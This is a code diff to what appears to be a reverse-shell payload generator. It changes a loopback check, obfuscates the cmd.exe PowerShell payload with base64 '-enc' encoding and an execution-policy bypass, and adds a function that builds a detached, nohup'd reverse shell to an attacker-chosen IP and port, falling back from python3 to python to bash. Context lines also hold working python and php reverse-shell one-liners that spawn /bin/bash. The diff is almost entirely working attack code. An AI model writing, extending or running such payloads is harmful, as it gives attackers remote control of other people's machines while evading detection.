@@ -15,7 +15,7 @@ def get_interfaces() -> dict[str, str]:
                 iface = line.split(":")[1].strip().split("@")[0]
             elif line.startswith("inet ") and iface:
                 ip = line.split()[1].split("/")[0]
-                if ip != "127.0.0.1":
+                if not ip.startswith("127."):
                     result[iface] = ip
     except Exception:
         pass
@@ -64,8 +64,23 @@ def _build_payloads(ip: str, port: int) -> dict[str, str]:
         "python":             f'python -c \'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'',
         "php":                f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/bash -i <&3 >&3 2>&3");\'',
         "powershell":         _PS_BASE,
-        "cmd.exe":            f"powershell -nop -ep bypass -c \"{_CMD_PAYLOAD}\"",
+        "cmd.exe":            f"powershell -nop -ep bypass -enc {base64.b64encode(_CMD_PAYLOAD.encode('utf-16-le')).decode()}",
     }
+
+
+def linux_callback_script(ip: str, port: int) -> str:
+    """POSIX-sh one-liner spawning a detached reverse shell to *ip:port*.
+
+    Python first so the session lands as a real PTY (no `upgrade` needed);
+    detached from the caller's stdio, else the delivering command blocks.
+    """
+    p = _build_payloads(ip, port)
+    return (
+        "d=; command -v setsid >/dev/null 2>&1 && d=setsid; "
+        f"if command -v python3 >/dev/null 2>&1; then $d nohup {p['python3']} >/dev/null 2>&1 & "
+        f"elif command -v python >/dev/null 2>&1; then $d nohup {p['python']} >/dev/null 2>&1 & "
+        f"else $d nohup {p['bash']} >/dev/null 2>&1 & fi"
+    )
 
 
 class PayloadGenerator:
